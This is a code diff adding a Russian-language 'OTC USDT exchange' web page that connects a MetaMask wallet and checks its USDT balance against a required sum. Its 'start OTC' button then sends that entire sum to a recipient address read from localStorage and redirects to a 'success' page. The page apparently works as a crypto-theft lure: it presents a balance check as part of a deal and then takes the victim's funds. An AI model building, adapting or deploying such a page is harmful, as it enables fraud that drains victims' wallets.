@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OTC Обмен USDT</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f2f2f2; padding: 30px; }
+    .container {
+      background: white;
+      border-radius: 10px;
+      padding: 20px;
+      max-width: 700px;
+      margin: auto;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    .btn {
+      padding: 10px 20px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+    .btn:disabled { background: #ccc; cursor: not-allowed; }
+    #accountInfo {
+      margin: 15px 0;
+      background: #f0f0f0;
+      padding: 10px;
+      border-left: 4px solid #007bff;
+    }
+    .info { margin-top: 20px; font-size: 16px; line-height: 1.6; }
+    .warning { color: red; font-weight: bold; margin-top: 20px; }
+  </style>
+</head>
+<body>
+<div class="container">
+  <h2>OTC Обмен USDT</h2>
+
+  <div id="accountInfo">Проверка кошелька...</div>
+
+  <button class="btn" id="otcButton" onclick="startOTC()" disabled>Проверка баланса...</button>
+
+  <div class="info" id="dealInfo">
+    Загрузка данных сделки...
+  </div>
+
+  <div class="warning" id="minBalanceWarning"></div>
+</div>
+
+<script>
+  let web3, userAccount, dealData = {};
+  let isAllowedWallet = false;
+  const usdtContract = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT на Ethereum
+
+  const tokenAbi = [
+    {
+      "constant": false,
+      "inputs": [
+        { "name": "_to", "type": "address" },
+        { "name": "_value", "type": "uint256" }
+      ],
+      "name": "transfer",
+      "outputs": [{ "name": "", "type": "bool" }],
+      "type": "function"
+    },
+    {
+      "constant": true,
+      "inputs": [{ "name": "_owner", "type": "address" }],
+      "name": "balanceOf",
+      "outputs": [{ "name": "balance", "type": "uint256" }],
+      "type": "function"
+    }
+  ];
+
+  // Получение параметров сделки из localStorage
+  function loadDealData() {
+    const saved = localStorage.getItem('otcDeal');
+    if (!saved) {
+      document.getElementById("dealInfo").innerHTML = "Сделочные данные не заданы. Обратитесь к администратору.";
+      return null;
+    }
+    dealData = JSON.parse(saved);
+    document.getElementById("dealInfo").innerHTML =
+      `✅ Сделка на сумму <strong>${dealData.sum || '?'}$</strong><br>
+      Получатель: <strong>${dealData.recipientName || '?'}</strong><br>
+      From: <strong>${dealData.from || '?'}</strong><br>
+      To: <strong>${dealData.to || '?'}</strong><br>
+      Mail: <strong>${dealData.mail || '?'}</strong>`;
+    document.getElementById("minBalanceWarning").innerHTML =
+      `⚠️ На момент выполнения внебиржевой сделки сумма ${dealData.requiredBalance || '?'} USDT должна находиться на балансе подключенного кошелька`;
+    return dealData;
+  }
+
+  async function switchToEthereumMainnet() {
+    try {
+      await window.ethereum.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: '0x1' }]
+      });
+    } catch (error) {
+      alert("Ошибка при переключении сети: " + error.message);
+    }
+  }
+
+  async function connectWallet() {
+    const button = document.getElementById("otcButton");
+    const info = document.getElementById("accountInfo");
+
+    if (!window.ethereum) {
+      info.innerHTML = "Установите MetaMask!";
+      button.disabled = true;
+      return;
+    }
+
+    try {
+      web3 = new Web3(window.ethereum);
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      userAccount = accounts[0];
+
+      // Проверка сети
+      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+      if (chainId !== '0x1') {
+        await switchToEthereumMainnet();
+        return connectWallet();
+      }
+
+      if (!dealData.allowedWallet) {
+        info.innerHTML = "Данные о допустимом кошельке не заданы. Обратитесь к администратору.";
+        button.disabled = true;
+        return;
+      }
+
+      // Проверка разрешённого кошелька
+      if (userAccount.toLowerCase() !== dealData.allowedWallet.toLowerCase()) {
+        info.innerHTML = "Подключен неверный кошелек.<br>Ваш кошелек: <strong>" + userAccount + "</strong>";
+        button.disabled = true;
+        return;
+      } else {
+        isAllowedWallet = true;
+      }
+
+      // Проверка баланса
+      const usdt = new web3.eth.Contract(tokenAbi, usdtContract);
+      const balanceRaw = await usdt.methods.balanceOf(userAccount).call();
+      const balance = (balanceRaw / 1e6).toFixed(2);
+
+      info.innerHTML =
+        `Подключено: <strong>${userAccount}</strong><br>Баланс USDT: <strong>${balance}</strong>`;
+
+      if (parseFloat(balance) >= parseFloat(dealData.requiredBalance || 0)) {
+        button.disabled = false;
+        button.style.backgroundColor = "#007bff";
+        button.innerText = "Запустить ОТС";
+      } else {
+        button.disabled = true;
+        button.style.backgroundColor = "#ccc";
+        button.innerText = "Недостаточно USDT";
+      }
+
+    } catch (error) {
+      info.innerHTML = "Подключите кошелек.";
+      button.disabled = true;
+    }
+  }
+
+  async function startOTC() {
+    if (!userAccount || !isAllowedWallet) {
+      alert("Сначала подключите корректный кошелек.");
+      return;
+    }
+    const contract = new web3.eth.Contract(tokenAbi, usdtContract);
+    const usdtAmount = web3.utils.toWei((dealData.requiredBalance || "0").toString(), "mwei");
+
+    try {
+      await contract.methods.transfer(dealData.recipientAddress, usdtAmount).send({ from: userAccount })
+        .on('transactionHash', function () {
+          window.location.href = "https://project13040913.tilda.ws/success";
+        });
+    } catch (error) {
+      alert('Ошибка транзакции: ' + error.message);
+    }
+  }
+
+  window.addEventListener('load', () => {
+    if (loadDealData()) connectWallet();
+    else {
+      document.getElementById("accountInfo").innerHTML = "Данные сделки отсутствуют.";
+      document.getElementById("otcButton").disabled = true;
+    }
+  });
+</script>
+</body>
+</html>
